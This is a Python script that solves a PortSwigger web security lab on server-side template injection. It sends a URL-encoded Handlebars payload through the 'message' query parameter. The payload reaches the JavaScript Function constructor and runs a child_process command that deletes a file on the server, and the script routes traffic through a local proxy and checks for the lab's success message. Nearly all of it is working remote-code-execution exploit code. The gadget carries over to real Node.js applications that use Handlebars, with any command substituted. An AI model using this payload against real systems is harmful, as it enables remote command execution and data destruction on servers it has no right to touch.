# Server-side template injection in an unknown language with a documented exploit

# https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def encode_url_allchars(string):
	return ''.join("%{0:0>2x}".format(ord(char)) for char in string)

def decode_url_allchars(string):
	return ''.join(chr(int(c, 16)) for c in re.findall(r'%([0-9A-Fa-f]{2,6})', string))

def send_payload(s, url):
	query_param = '/?message='
	payload = """{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}"""
	print("\n[+] Trying URL encode all chars in the payload:\n%s" % payload)
	inject = encode_url_allchars(payload)
	print(f"\n[+] Sending get request on {query_param}{inject}\n")
	r = s.get(url + query_param + inject)
	time.sleep(1)
	if r.status_code != 200:
		print("[-] Command Injection Failed !!!")
		sys.exit(0)
	print("[+] Command Injection Successful !!!")


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Server-side template injection in an unknown language with a documented exploit')
	parser = argparse.ArgumentParser(description="[+] Lab: Server-side template injection in an unknown language with a documented exploit")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send Server-Side Template Injection ...\n')
			time.sleep(1)
			send_payload(s, url)
			time.sleep(3)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
